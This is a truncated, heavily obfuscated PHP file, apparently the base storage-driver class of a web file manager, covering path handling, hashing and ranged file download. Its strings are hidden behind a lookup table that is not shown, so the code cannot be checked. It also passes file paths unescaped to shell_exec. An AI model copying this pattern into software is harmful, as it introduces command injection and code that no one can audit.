<?php
 goto Fßà‹ç¥Û˜; f‰²´˜Ø¨Õ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $µçÚâº‰ =& $_SERVER[¢ñàß¿€]; $this->objectDriver = array($µçÚâº‰[60], $µçÚâº‰[61], $µçÚâº‰[62], $µçÚâº‰[63], $µçÚâº‰[64], $µçÚâº‰[65], $µçÚâº‰[66], $µçÚâº‰[67], $µçÚâº‰[68], $µçÚâº‰[69], $µçÚâº‰[70], $µçÚâº‰[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¬¡ö¶ı¼) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¬¡ö¶ı¼, $_SERVER[¢ñàß¿€][8]); } return $¬¡ö¶ı¼; } public function iconvApp($Ê¸ŠòÓÖ) { return $Ê¸ŠòÓÖ; } public function iconvSystem($ˆ­¨êº) { return $ˆ­¨êº; } public function iconvTo($¬¤Æ‘´Ü, $˜°ËşŸ, $€Òç«î) { $’ˆ ‡œ½ =& $_SERVER[¢ñàß¿€]; if (!$¬¤Æ‘´Ü || !function_exists($’ˆ ‡œ½[72])) { return $¬¤Æ‘´Ü; } static $şû‡¨‰Ú = array(); $ªû“ïßº = $˜°ËşŸ . $’ˆ ‡œ½[73] . $€Òç«î . $’ˆ ‡œ½[74] . $¬¤Æ‘´Ü; if (isset($şû‡¨‰Ú[$ªû“ïßº])) { return $şû‡¨‰Ú[$ªû“ïßº]; } if (function_exists($’ˆ ‡œ½[75])) { $ûĞä‰Æß = @mb_convert_encoding($¬¤Æ‘´Ü, $€Òç«î, $˜°ËşŸ); } else { $ûĞä‰Æß = @iconv($˜°ËşŸ, $€Òç«î, $¬¤Æ‘´Ü); } $ûĞä‰Æß = $ûĞä‰Æß ? $ûĞä‰Æß : $¬¤Æ‘´Ü; if (strstr($ûĞä‰Æß, $’ˆ ‡œ½[76])) { $ûĞä‰Æß = str_replace($’ˆ ‡œ½[76], $’ˆ ‡œ½[11], $ûĞä‰Æß); } $şû‡¨‰Ú[$˜°ËşŸ . $’ˆ ‡œ½[73] . $€Òç«î . $’ˆ ‡œ½[74] . $¬¤Æ‘´Ü] = $ûĞä‰Æß; $şû‡¨‰Ú[$€Òç«î . $’ˆ ‡œ½[73] . $˜°ËşŸ . $’ˆ ‡œ½[74] . $¬¤Æ‘´Ü] = $¬¤Æ‘´Ü; $şû‡¨‰Ú[$€Òç«î . $’ˆ ‡œ½[73] . $˜°ËşŸ . $’ˆ ‡œ½[74] . $ûĞä‰Æß] = $¬¤Æ‘´Ü; $şû‡¨‰Ú[$˜°ËşŸ . $’ˆ ‡œ½[73] . $€Òç«î . $’ˆ ‡œ½[74] . $ûĞä‰Æß] = $ûĞä‰Æß; return $ûĞä‰Æß; } public function getPathInner($Æ°œÆ¾) { $õîã¼ô­ = IO::init($Æ°œÆ¾); return $õîã¼ô­->path; } public function getPathOuter($™˜“âš±) { $£¹ì¹ÇÙ =& $_SERVER[¢ñàß¿€]; $È«Ñº²º = strlen(trim($this->pathBase, $£¹ì¹ÇÙ[8])); $™˜“âš± = substr(trim($™˜“âš±, $£¹ì¹ÇÙ[8]), $È«Ñº²º); return $this->pathDriver . $£¹ì¹ÇÙ[8] . ltrim($™˜“âš±, $£¹ì¹ÇÙ[8]); } public function isParentOf($ëŞ–‰Åù, $Æâ‡ ÆŠ) { $•£á–¿ =& $_SERVER[¢ñàß¿€]; $ëŞ–‰Åù = rtrim(strtolower($ëŞ–‰Åù), $•£á–¿[8]) . $•£á–¿[8]; $Æâ‡ ÆŠ = rtrim(strtolower($Æâ‡ ÆŠ), $•£á–¿[8]) . $•£á–¿[8]; $áÓ° = strpos($Æâ‡ ÆŠ, $ëŞ–‰Åù) === 0; return $áÓ°; } public function getType() { $ºí‹¨ş =& $_SERVER[¢ñàß¿€]; $–ñĞ€† = str_replace($ºí‹¨ş[77], $ºí‹¨ş[12], get_class($this)); return strtolower($–ñĞ€†); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($µŠ·ıÚÖ, $£Î¤¦›) { $Ÿ·ó¢¶Ú =& $_SERVER[¢ñàß¿€]; $ÓÄù«ÊÑ = rtrim($µŠ·ıÚÖ, $Ÿ·ó¢¶Ú[8]) . $Ÿ·ó¢¶Ú[8] . $£Î¤¦›; $‡§—·…ú = $this->exist($ÓÄù«ÊÑ); return $‡§—·…ú ? $ÓÄù«ÊÑ : !1; } public function setModifyTime($ÊñÒû§’, $¿‚³ÓºÈ = '') { } public function renameObject($ü¨¹æÏÂ, $ø¾æ«Ôß) { $§«´¢”ì = $ø¾æ«Ôß; $ü¨¹æÏÂ = $this->getPathOuter($ü¨¹æÏÂ); $ø¾æ«Ôß = $this->pathFather($ü¨¹æÏÂ) . $ø¾æ«Ôß; $¥–€ª‡è = IO::copy($ü¨¹æÏÂ, $this->pathFather($ü¨¹æÏÂ), REPEAT_RENAME_FOLDER, $§«´¢”ì); if ($¥–€ª‡è) { IO::remove($ü¨¹æÏÂ); } return $¥–€ª‡è ? $ø¾æ«Ôß : !1; } public function tempFile($±ßŞß—Õ = '', $ÌáÀĞƒì = '') { if (!$±ßŞß—Õ) { $±ßŞß—Õ = rand_string(15); } $©Èæ¾‰Â = TEMP_FILES . rand_string(15) . $_SERVER[¢ñàß¿€][8]; @mkdir($©Èæ¾‰Â, DEFAULT_PERRMISSIONS, !0); $â€Šé†Ÿ = $©Èæ¾‰Â . $±ßŞß—Õ; @touch($â€Šé†Ÿ); if ($ÌáÀĞƒì) { file_put_contents($â€Šé†Ÿ, $ÌáÀĞƒì); } return $â€Šé†Ÿ; } public function tempFileRemve($í¶œ«°Â) { @unlink($í¶œ«°Â); @rmdir($this->pathFather($í¶œ«°Â)); } public function mkfile($´³”íšà, $ú¢¡Ñ±ç = '', $§Ùá…üç = REPEAT_RENAME) { } public function mkdir($·¯¤£©İ, $ı¨ƒ¢è³ = REPEAT_SKIP) { } public function delFile($À¹ƒ—öõ) { } public function delFolder($·Ù¯˜›¸) { } public function copyFile($ÇÆûä»ş, $„œİıÌÓ) { } public function moveFile($Œ¾ Ì°“, $®ïÀè—«) { } public function remove($§±íˆŒ‘) { if ($this->isFile($§±íˆŒ‘)) { return $this->delFile($§±íˆŒ‘); } return $this->delFolder($§±íˆŒ‘); } public function rename($‚ƒÒÑİÆ, $Ü¬®Ï’’) { } public function exist($áá·Ê²) { } public function findByHash($ë¤Îêßª = '', $¾âİŸ©á = '') { return !1; } public function isFile($ğğõ¾È¶) { } public function isFolder($—²æÇ¿) { } public function size($ÈŠ†æ—Ş) { } public function info($¶‰¥Ùı) { } public function infoSimple($£Ç›®—…) { return $this->info($£Ç›®—…); } public function infoAuth($§Î°Å§Ğ) { return $this->info($§Î°Å§Ğ); } public function infoFull($í¿ìŒ…ˆ) { return $this->info($í¿ìŒ…ˆ); } public function infoFullSimple($‰»ÁÁ„) { return $this->info($‰»ÁÁ„); } public function infoWithChildren($ÂØ“ã‡º) { $ßáÌ‡›” =& $_SERVER[¢ñàß¿€]; static $ã®ê›Üâ = array(); if (isset($ã®ê›Üâ[$ÂØ“ã‡º])) { return $ã®ê›Üâ[$ÂØ“ã‡º]; } $‰¹Ùâœ¹ = $this->info($ÂØ“ã‡º); if ($‰¹Ùâœ¹ && $‰¹Ùâœ¹[$ßáÌ‡›”[33]] == $ßáÌ‡›”[78]) { $ÙÊ«éü = array($ßáÌ‡›”[79] => 0, $ßáÌ‡›”[80] => 0, $ßáÌ‡›”[81] => 0); $this->infoChildren($ÂØ“ã‡º, $ÙÊ«éü); $‰¹Ùâœ¹[$ßáÌ‡›”[79]] = $ÙÊ«éü[$ßáÌ‡›”[79]]; $‰¹Ùâœ¹[$ßáÌ‡›”[82]] = array($ßáÌ‡›”[83] => $ÙÊ«éü[$ßáÌ‡›”[80]], $ßáÌ‡›”[84] => $ÙÊ«éü[$ßáÌ‡›”[81]]); $ã®ê›Üâ[$ÂØ“ã‡º] = $‰¹Ùâœ¹; } return $‰¹Ùâœ¹; } public function listPath($ı´úßö¿, $›òÔóµî = false) { } public function has($úˆ¢˜ˆ­, $Ûç åöâ = false, $—·»ı·‘ = false) { } public function canRead($–Ã€«ğé) { } public function canWrite($Æ¤‚şÓ) { } public function getContent($İà¥¢Ô†) { } public function setContent($ÃòéÆ”œ, $º§¦È“Ğ = '') { } protected function infoChildren($ÕŒ¦İşŸ, &$ø¶ç”²×) { $ÓÂù¨– =& $_SERVER[¢ñàß¿€]; check_abort_echo(); $¿Ğº‚•¨ = $this->listPath($ÕŒ¦İşŸ, !0); $¿Ğº‚•¨ = array_merge($¿Ğº‚•¨[$ÓÂù¨–[85]], $¿Ğº‚•¨[$ÓÂù¨–[86]]); foreach ($¿Ğº‚•¨ as $µÏâ§ÕÅ) { if ($µÏâ§ÕÅ[$ÓÂù¨–[33]] == $ÓÂù¨–[78]) { $ø¶ç”²×[$ÓÂù¨–[81]]++; $à‘ˆ‰şŒ = $this->getPathInner($µÏâ§ÕÅ[$ÓÂù¨–[87]]); $this->infoChildren($à‘ˆ‰şŒ, $ø¶ç”²×); } else { $ø¶ç”²×[$ÓÂù¨–[80]]++; $ø¶ç”²×[$ÓÂù¨–[79]] += $µÏâ§ÕÅ[$ÓÂù¨–[79]]; } } } public function fileSubstr($£Š“ÒõÁ, $–çó’é, $”€Ñâš) { } public function listAll($ÇäĞÃş) { } public function listAllMake($¸¶ıÉË›, &$†£æŞá ) { $¡ëá™â =& $_SERVER[¢ñàß¿€]; check_abort_echo(); $µóä¢«Æ = $this->listPath($¸¶ıÉË›, !0); if (!$µóä¢«Æ) { return; } $÷©Ò¿ÚÓ = array_merge($µóä¢«Æ[$¡ëá™â[85]], $µóä¢«Æ[$¡ëá™â[86]]); foreach ($÷©Ò¿ÚÓ as $›æŒ´ûà) { $‘ÙÑº§Ú = $›æŒ´ûà[$¡ëá™â[33]] == $¡ëá™â[78]; $Ôê„ØÃÎ = array($¡ëá™â[87] => $›æŒ´ûà[$¡ëá™â[87]], $¡ëá™â[78] => $‘ÙÑº§Ú); if (isset($›æŒ´ûà[$¡ëá™â[79]])) { $Ôê„ØÃÎ[$¡ëá™â[79]] = $›æŒ´ûà[$¡ëá™â[79]]; } if (isset($›æŒ´ûà[$¡ëá™â[88]])) { $Ôê„ØÃÎ[$¡ëá™â[88]] = $›æŒ´ûà[$¡ëá™â[88]]; } if (!$‘ÙÑº§Ú) { $†£æŞá [] = $Ôê„ØÃÎ; continue; } $†£æŞá [] = $Ôê„ØÃÎ; $¡åñõ¥½ = $›æŒ´ûà[$¡ëá™â[87]]; $…ÊÖàˆÁ = $this->pathDriver; if (substr($›æŒ´ûà[$¡ëá™â[87]], 0, strlen($…ÊÖàˆÁ)) == $…ÊÖàˆÁ) { $¡åñõ¥½ = substr($¡åñõ¥½, strlen($…ÊÖàˆÁ)); } $this->listAllMake($¡åñõ¥½, $†£æŞá ); } } public function listAllSimple($Å£Î½­­, $´¨†Ø„Ï = false) { $”®ª¿ß— = $this->listAll($Å£Î½­­); return $this->listAllSimpleMake($”®ª¿ß—, $this->getPathOuter($Å£Î½­­), $´¨†Ø„Ï); } public function listAllSimpleMake($§ñ¦¦À, $İ’æêÂ…, $èÏ‡ì¨¿) { $İÏª‚–‚ =& $_SERVER[¢ñàß¿€]; $á©§Áùç = array(); $İ’æêÂ… = rtrim(get_path_father($İ’æêÂ…), $İÏª‚–‚[8]) . $İÏª‚–‚[8]; foreach ($§ñ¦¦À as $‚ŞµšÇ) { $å¨€éÃÍ = array($İÏª‚–‚[87] => $‚ŞµšÇ[$İÏª‚–‚[87]], $İÏª‚–‚[89] => $‚ŞµšÇ[$İÏª‚–‚[87]], $İÏª‚–‚[78] => $‚ŞµšÇ[$İÏª‚–‚[78]]); if (isset($‚ŞµšÇ[$İÏª‚–‚[79]]) && !$‚ŞµšÇ[$İÏª‚–‚[78]]) { $å¨€éÃÍ[$İÏª‚–‚[79]] = $‚ŞµšÇ[$İÏª‚–‚[79]]; } if (isset($‚ŞµšÇ[$İÏª‚–‚[88]])) { $å¨€éÃÍ[$İÏª‚–‚[88]] = $‚ŞµšÇ[$İÏª‚–‚[88]]; } if (is_array($‚ŞµšÇ[$İÏª‚–‚[90]])) { $å¨€éÃÍ[$İÏª‚–‚[89]] = $‚ŞµšÇ[$İÏª‚–‚[90]][$İÏª‚–‚[87]]; $å¨€éÃÍ[$İÏª‚–‚[79]] = $‚ŞµšÇ[$İÏª‚–‚[90]][$İÏª‚–‚[79]]; $å¨€éÃÍ[$İÏª‚–‚[88]] = $‚ŞµšÇ[$İÏª‚–‚[90]][$İÏª‚–‚[88]]; } else { if (substr($‚ŞµšÇ[$İÏª‚–‚[87]], 0, strlen($İ’æêÂ…)) == $İ’æêÂ…) { $å¨€éÃÍ[$İÏª‚–‚[87]] = substr($‚ŞµšÇ[$İÏª‚–‚[87]], strlen($İ’æêÂ…)); } } $Ïµ¸¢Æ÷ = $‚ŞµšÇ[$İÏª‚–‚[78]] ? $İÏª‚–‚[8] : $İÏª‚–‚[12]; $å¨€éÃÍ[$İÏª‚–‚[89]] = rtrim($å¨€éÃÍ[$İÏª‚–‚[89]], $İÏª‚–‚[8]) . $Ïµ¸¢Æ÷; $å¨€éÃÍ[$İÏª‚–‚[87]] = $İÏª‚–‚[8] . trim($å¨€éÃÍ[$İÏª‚–‚[87]], $İÏª‚–‚[8]) . $Ïµ¸¢Æ÷; if (!$èÏ‡ì¨¿) { $£—šäÅÊ = explode($İÏª‚–‚[8], trim($å¨€éÃÍ[$İÏª‚–‚[87]], $İÏª‚–‚[8])); $å¨€éÃÍ[$İÏª‚–‚[87]] = $İÏª‚–‚[8] . implode($İÏª‚–‚[8], array_slice($£—šäÅÊ, 1)) . $Ïµ¸¢Æ÷; } $á©§Áùç[] = $å¨€éÃÍ; } return array_sort_by($á©§Áùç, $İÏª‚–‚[87]); } public function upload($‹€Êàà„, $À¶–ö„ù, $ö¼øØà = false, $Ê¶±¿£ = REPEAT_REPLACE) { } public function uploadFileByID($ùù¥ü³, $ü¬ÙÃÓç, $áîÀ¥åÎ) { } public function uploadFileByPath($¬˜¾Àû¿, $×½ÖÏ â, $îôÉä¤¤ = array()) { } public function isUploadServer() { $É÷“½Áè =& $_SERVER[¢ñàß¿€]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $É÷“½Áè[91]) { return !0; } return $GLOBALS[$É÷“½Áè[6]][$É÷“½Áè[92]][$É÷“½Áè[93]]; } public function isFileOutServer() { $Òò–Ùœ¹ =& $_SERVER[¢ñàß¿€]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Òò–Ùœ¹[91]) { return !0; } return $GLOBALS[$Òò–Ùœ¹[6]][$Òò–Ùœ¹[92]][$Òò–Ùœ¹[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ğƒå—”Ş) { $³®İÔ§½ =& $_SERVER[¢ñàß¿€]; if (!$this->isCdnHost()) { return $Ğƒå—”Ş; } return str_replace(trim(get_url_root($Ğƒå—”Ş), $³®İÔ§½[8]), trim($this->cdnHost, $³®İÔ§½[8]), $Ğƒå—”Ş); } public function uploadLink($Îèéµ, $êÊ·ùËä = 0) { $ÒñÅ¸Èá =& $_SERVER[¢ñàß¿€]; if ($this->isUploadServer()) { return; } $·´˜«Í¹ = $this->getType(); if (!in_array($·´˜«Í¹, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ëÏˆ´„ = 1024 * 1024 * 10; $ŸüÆ˜¹¬ = $êÊ·ùËä <= $ëÏˆ´„ ? $ÒñÅ¸Èá[95] : $ÒñÅ¸Èá[96]; $Üì¥Á±¯ = (!$êÊ·ùËä ? 1 : ceil($êÊ·ùËä / pow(1024, 3))) * 3600 * 4; $´¨™­¨£ = $this->{$ŸüÆ˜¹¬}($Îèéµ, $Üì¥Á±¯); if ($´¨™­¨£) { $´¨™­¨£[$ÒñÅ¸Èá[97]] = $Îèéµ; $´¨™­¨£[$ÒñÅ¸Èá[98]] = $·´˜«Í¹; } return $´¨™­¨£; } public function uploadFormData($ÂßÍ» ¬, $ ŠèŸªé = 3600) { } public function multiUploadFormData($¦ƒÉ°ªÜ, $şà©ßç = 3600) { } public function download($™şÁÖØë, $­¥Æ¤Äí) { } public function ext($¿ğÓÑŸæ) { $ÊªÙ‘»â =& $_SERVER[¢ñàß¿€]; if (strpos($¿ğÓÑŸæ, $ÊªÙ‘»â[8]) === -1) { $ÂÂŒÌ = $¿ğÓÑŸæ; } else { $ÂÂŒÌ = $this->pathThis($¿ğÓÑŸæ); } $Âæü³Î£ = $ÊªÙ‘»â[12]; if (strstr($ÂÂŒÌ, $ÊªÙ‘»â[10])) { $Âæü³Î£ = substr($ÂÂŒÌ, strrpos($ÂÂŒÌ, $ÊªÙ‘»â[10]) + 1); $Âæü³Î£ = strtolower($Âæü³Î£); } if (strlen($Âæü³Î£) > 3 && preg_match($ÊªÙ‘»â[99], $Âæü³Î£, $åÍ¥Ïô·)) { $Âæü³Î£ = $ÊªÙ‘»â[12]; } return $Âæü³Î£; } public function pathThis($¡Ñ‡«£”) { $¼ïŞ³ÈÏ =& $_SERVER[¢ñàß¿€]; $¡Ñ‡«£” = str_replace($¼ïŞ³ÈÏ[100], $¼ïŞ³ÈÏ[8], rtrim($¡Ñ‡«£”, $¼ïŞ³ÈÏ[8])); $Ô¶Ê˜é— = strrpos($¡Ñ‡«£”, $¼ïŞ³ÈÏ[8]); if ($Ô¶Ê˜é— === !1) { return $¡Ñ‡«£”; } return substr($¡Ñ‡«£”, $Ô¶Ê˜é— + 1); } public function pathFather($ß˜ëÄ°Ö) { $«ªÚó•Ã =& $_SERVER[¢ñàß¿€]; $ß˜ëÄ°Ö = str_replace($«ªÚó•Ã[100], $«ªÚó•Ã[8], rtrim($ß˜ëÄ°Ö, $«ªÚó•Ã[8])); $¡åÏî³å = strrpos($ß˜ëÄ°Ö, $«ªÚó•Ã[8]); if ($¡åÏî³å === !1) { return $«ªÚó•Ã[12]; } return substr($ß˜ëÄ°Ö, 0, $¡åÏî³å + 1); } public function hashSimple($”¢ï“Ó) { $­†¾¯²Ê =& $_SERVER[¢ñàß¿€]; if (!$”¢ï“Ó) { return md5($­†¾¯²Ê[12]); } $ô¤òƒØ¾ = $this->size($”¢ï“Ó); $ñÆã×‰ç = 200; $°èº†Ìƒ = 50; if ($ô¤òƒØ¾ <= $ñÆã×‰ç * $°èº†Ìƒ) { return $this->hashMd5($”¢ï“Ó) . $ô¤òƒØ¾; } $É¨û† = intval($ô¤òƒØ¾ / $°èº†Ìƒ); $ÔÊÛª¹˜ = $­†¾¯²Ê[12]; for ($‚ş¸Œ‡ = 0; $‚ş¸Œ‡ < $°èº†Ìƒ; $‚ş¸Œ‡++) { $ÔÊÛª¹˜ .= $this->fileSubstr($”¢ï“Ó, $É¨û† * $‚ş¸Œ‡, $ñÆã×‰ç); } $ÔÊÛª¹˜ .= $this->fileSubstr($”¢ï“Ó, $ô¤òƒØ¾ - $ñÆã×‰ç, $ñÆã×‰ç); return md5($ÔÊÛª¹˜) . $ô¤òƒØ¾; } public static $md5Cache = array(); public function hashMd5($€ïİ„ğæ) { if (!$€ïİ„ğæ) { return md5($_SERVER[¢ñàß¿€][12]); } $€ïİ„ğæ = $this->iconvSystem($€ïİ„ğæ); if (isset(self::$md5Cache[$€ïİ„ğæ])) { return self::$md5Cache[$€ïİ„ğæ]; } self::$md5Cache[$€ïİ„ğæ] = $this->hashMd5Shell($€ïİ„ğæ); if (!self::$md5Cache[$€ïİ„ğæ]) { self::$md5Cache[$€ïİ„ğæ] = @md5_file($€ïİ„ğæ); } return self::$md5Cache[$€ïİ„ğæ]; } private function hashMd5Shell($«¿Ÿîà) { $©ãØİˆ‘ =& $_SERVER[¢ñàß¿€]; if (!$«¿Ÿîà) { return md5($©ãØİˆ‘[12]); } if (!function_exists($©ãØİˆ‘[101])) { return !1; } $òªçû¢™ = array($©ãØİˆ‘[102], $©ãØİˆ‘[103]); $ÊŸÔ½·ï = Cache::get($©ãØİˆ‘[104]); if (!$ÊŸÔ½·ï) { $¥Û£àı = BASIC_PATH . $©ãØİˆ‘[105]; $ÒÍÜ“°ƒ = md5_file($¥Û£àı); $ÊŸÔ½·ï = $©ãØİˆ‘[106]; foreach ($òªçû¢™ as $š£š™ëÃ) { $Ñß²ÖûÍ = shell_exec($š£š™ëÃ . "\x20\42{$¥Û£àı}\42"); if ($Ñß²ÖûÍ && substr(trim($Ñß²ÖûÍ), 0, 32) == $ÒÍÜ“°ƒ) { $ÊŸÔ½·ï = $š£š™ëÃ; break; } } Cache::set($©ãØİˆ‘[104], $ÊŸÔ½·ï, 3600); } if ($ÊŸÔ½·ï == $©ãØİˆ‘[106]) { return !1; } $Ñß²ÖûÍ = shell_exec($ÊŸÔ½·ï . "\40\42{$«¿Ÿîà}\x22"); $Ñß²ÖûÍ = str_replace($©ãØİˆ‘[107], $©ãØİˆ‘[12], $Ñß²ÖûÍ); return substr($Ñß²ÖûÍ, 0, 32); } public function link($Ÿ”ÕÙÛ¹) { return $Ÿ”ÕÙÛ¹; } public function fileOut($Œöı÷îœ, $¢…Ú¯É = false, $”Ì÷ßÊ = false, $ï»›¼êî = '') { $ÊÍğ€–ã =& $_SERVER[¢ñàß¿€]; $this->cacheMethod(null, null); if (!$Œöı÷îœ || !$this->exist($Œöı÷îœ)) { show_json(LNG($ÊÍğ€–ã[108]), !1, $”Ì÷ßÊ); } $şÛÕ™ı = $this->getType() == $ÊÍğ€–ã[109]; $±¦€ÔŞÁ = $GLOBALS[$ÊÍğ€–ã[6]][$ÊÍğ€–ã[92]][$ÊÍğ€–ã[110]][$ÊÍğ€–ã[111]]; $È¾ÖçÂ = (double) $GLOBALS[$ÊÍğ€–ã[6]][$ÊÍğ€–ã[92]][$ÊÍğ€–ã[110]][$ÊÍğ€–ã[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ŞÊ—€ñÁ = $this->infoFull($Œöı÷îœ); $¼Ææ¦€§ = $ŞÊ—€ñÁ[$ÊÍğ€–ã[79]]; $š³ÂÒÜ = gmdate($ÊÍğ€–ã[113], $ŞÊ—€ñÁ[$ÊÍğ€–ã[88]]); $ş¸ÍûÌº = $”Ì÷ßÊ ? $”Ì÷ßÊ : $this->iconvApp($ŞÊ—€ñÁ[$ÊÍğ€–ã[32]]); $Ğ½¸ˆà‚ = 0; $ßñÁŸ = $¼Ææ¦€§ - 1; $Å–ˆÈĞ = $this->ext($ş¸ÍûÌº); if (in_array($Å–ˆÈĞ, array($ÊÍğ€–ã[114], $ÊÍğ€–ã[115], $ÊÍğ€–ã[116], $ÊÍğ€–ã[117]))) { $Å–ˆÈĞ = $ÊÍğ€–ã[118]; } if (in_array($Å–ˆÈĞ, array($ÊÍğ€–ã[119]))) { $Å–ˆÈĞ = $ÊÍğ€–ã[120]; } if (!$ï»›¼êî) { $ï»›¼êî = md5($š³ÂÒÜ . $¼Ææ¦€§); } $ï»›¼êî = $ÊÍğ€–ã[121] . $ï»›¼êî . $ÊÍğ€–ã[121]; $¡¨ûÚöŒ = get_file_mime($Å–ˆÈĞ); $¢úÃíïõ = !0; $¢úÃíïõ = isset($_GET[$ÊÍğ€–ã[122]]) ? !1 : !0; if ($¢…Ú¯É === !1 && !mime_support($¡¨ûÚöŒ)) { $¡¨ûÚöŒ = $ÊÍğ€–ã[123]; } header($ÊÍğ€–ã[124]); header($ÊÍğ€–ã[125] . $¡¨ûÚöŒ); $€¹°ñÃñ = rawurlencode($ş¸ÍûÌº); $€¹°ñÃñ = $ÊÍğ€–ã[121] . $€¹°ñÃñ . $ÊÍğ€–ã[126] . $€¹°ñÃñ; if ($¢…Ú¯É) { header($ÊÍğ€–ã[127]); header($ÊÍğ€–ã[128] . $€¹°ñÃñ); } else { if ($¢úÃíïõ) { header($ÊÍğ€–ã[129] . $€¹°ñÃñ); } } $µ¹´—™¿ = 3600 * 24 * 30; header($ÊÍğ€–ã[130]); header($ÊÍğ€–ã[131]); header($ÊÍğ€–ã[132] . $µ¹´—™¿); header($ÊÍğ€–ã[133] . gmdate($ÊÍğ€–ã[113], time() + $µ¹´—™¿) . $ÊÍğ€–ã[134]); if (isset($_SERVER[$ÊÍğ€–ã[135]]) && strtotime($_SERVER[$ÊÍğ€–ã[135]]) == $ŞÊ—€ñÁ[$ÊÍğ€–ã[88]]) { header($ÊÍğ€–ã[136], !0, 304); die; } if (isset($_SERVER[$ÊÍğ€–ã[137]]) && $_SERVER[$ÊÍğ€–ã[137]] == $ï»›¼êî) { header($ÊÍğ€–ã[138] . $ï»›¼êî, !0, 304); die; } header($ÊÍğ€–ã[138] . $ï»›¼êî); header($ÊÍğ€–ã[139] . $š³ÂÒÜ . $ÊÍğ€–ã[134]); header($ÊÍğ€–ã[140] . $ş¸ÍûÌº); header($ÊÍğ€–ã[141]); header($ÊÍğ€–ã[142] . $¼Ææ¦€§); header($ÊÍğ€–ã[143]); Hook::trigger($ÊÍğ€–ã[144], $Œöı÷îœ, $¼Ææ¦€§, $ş¸ÍûÌº, $Å–ˆÈĞ); if (!$¢…Ú¯É && $Å–ˆÈĞ == $ÊÍğ€–ã[145]) { if ($¼Ææ¦€§ > 1024 * 1024 * 5) { die; } $ËÈÊíú® = $this->getContent($Œöı÷îœ); $ËÈÊíú® = Html::clearSVG($ËÈÊíú®); header($ÊÍğ€–ã[146] . strlen($ËÈÊíú®)); echo $ËÈÊíú®; die; } $âÀœõß† = strtolower($_SERVER[$ÊÍğ€–ã[147]]); if ($şÛÕ™ı && $âÀœõß† && $±¦€ÔŞÁ) { if (strstr($âÀœõß†, $ÊÍğ€–ã[148])) { header($ÊÍğ€–ã[149] . $Œöı÷îœ); } else { if (strstr($âÀœõß†, $ÊÍğ€–ã[150])) { header($ÊÍğ€–ã[151] . $Œöı÷îœ); } else { if (strstr($âÀœõß†, $ÊÍğ€–ã[152])) { header($ÊÍğ€–ã[153] . $Œöı÷îœ); } } } if ($È¾ÖçÂ) { header($ÊÍğ€–ã[154] . $È¾ÖçÂ); } return; } if (isset($_SERVER[$ÊÍğ€–ã[155]])) { if (preg_match($ÊÍğ€–ã[156], $_SERVER[$ÊÍğ€–ã[155]], $Ü ÜÏè)) { $Ğ½¸ˆà‚ = intval($Ü ÜÏè[1]); $Ğ½¸ˆà‚ = $Ğ½¸ˆà‚ <= 0 ? 0 : ($Ğ½¸ˆà‚ >= $ßñÁŸ ? $ßñÁŸ : $Ğ½¸ˆà‚); if (!empty($Ü ÜÏè[2])) { $²®ûªè‹ = intval($Ü ÜÏè[2]); $ßñÁŸ = $²®ûªè‹ < $Ğ½¸ˆà‚ ? $Ğ½¸ˆà‚ : ($²®ûªè‹ >= $ßñÁŸ ? $ßñÁŸ : $²®ûªè‹); } } header($ÊÍğ€–ã[157]); header("\103\x6f\156\x74\x65\156\164\55\x52\x61\156\147\145\x3a\40\x62\x79\x74\x65\x73\x20{$Ğ½¸ˆà‚}\x2d{$ßñÁŸ}\57" . $¼Ææ¦€§); } else { header($ÊÍğ€–ã[158]); } header($ÊÍğ€–ã[159]); header($ÊÍğ€–ã[160]); $ğ·âÌµ¿ = !0; if ($_SERVER[$ÊÍğ€–ã[161]] == $ÊÍğ€–ã[162] && $¼Ææ¦€§ > 1204 * 1024 * 1024 * 2) { $ğ·âÌµ¿ = !1; } if ($ğ·âÌµ¿) { header($ÊÍğ€–ã[163] . ($ßñÁŸ - $Ğ½¸ˆà‚ + 1)); } if ($_SERVER[$ÊÍğ€–ã[164]] == $ÊÍğ€–ã[165]) { return; } $‘µ¹µÌº = array($ÊÍğ€–ã[166] => !1, $ÊÍğ€–ã[167] => $Ğ½¸ˆà‚, $ÊÍğ€–ã[168] => $ßñÁŸ, $ÊÍğ€–ã[169] => $Å–ˆÈĞ, $ÊÍğ€–ã[170] => $ŞÊ—€ñÁ, $ÊÍğ€–ã[171] => $ÊÍğ€–ã[12], $ÊÍğ€–ã[172] => 0); $‘µ¹µÌº = Hook::filter($ÊÍğ€–ã[173], $‘µ¹µÌº); $õ¾ºÅĞÔ = 1024 * 300; $—ìÛóõª = 0; if ($È¾ÖçÂ) { $—ìÛóõª = intval(1000 * 1000 * ($õ¾ºÅĞÔ / $È¾ÖçÂ)); } while ($Ğ½¸ˆà‚ <= $ßñÁŸ) { $¥÷ğÜó… = timeFloat(); check_abort(); $»ôºƒ¤ë = $ßñÁŸ - $Ğ½¸ˆà‚ + 1; if ($»ôºƒ¤ë <= $õ¾ºÅĞÔ) { $õ¾ºÅĞÔ = $»ôºƒ¤ë; } $ËÈÊíú® = $this->fileSubstr($Œöı÷îœ, $Ğ½¸ˆà‚, $õ¾ºÅĞÔ); if ($‘µ¹µÌº[$ÊÍğ€–ã[166]]) { $‘µ¹µÌº[$ÊÍğ€–ã[171]] = $ËÈÊíú®; $‘µ¹µÌº[$ÊÍğ€–ã[172]] = $Ğ½¸ˆà‚; $‘µ¹µÌº = Hook::filter($ÊÍğ€–ã[174], $‘µ¹µÌº); $ËÈÊíú® = $‘µ¹µÌº[$ÊÍğ€–ã[171]]; } echo $ËÈÊíú®; $Ğ½¸ˆà‚ += $õ¾ºÅĞÔ; if ($õ¾ºÅĞÔ == $»ôºƒ¤ë) { $Ğ½¸ˆà‚ = $ßñÁŸ + 1; } if ($—ìÛóõª) { $èé©›§ƒ = intval(1000 * 1000 * (timeFloat() - $¥÷ğÜó…)); $¯òğ üô = $—ìÛóõª - $èé©›§ƒ; if ($¯òğ üô > 5) { usleep($¯òğ üô); 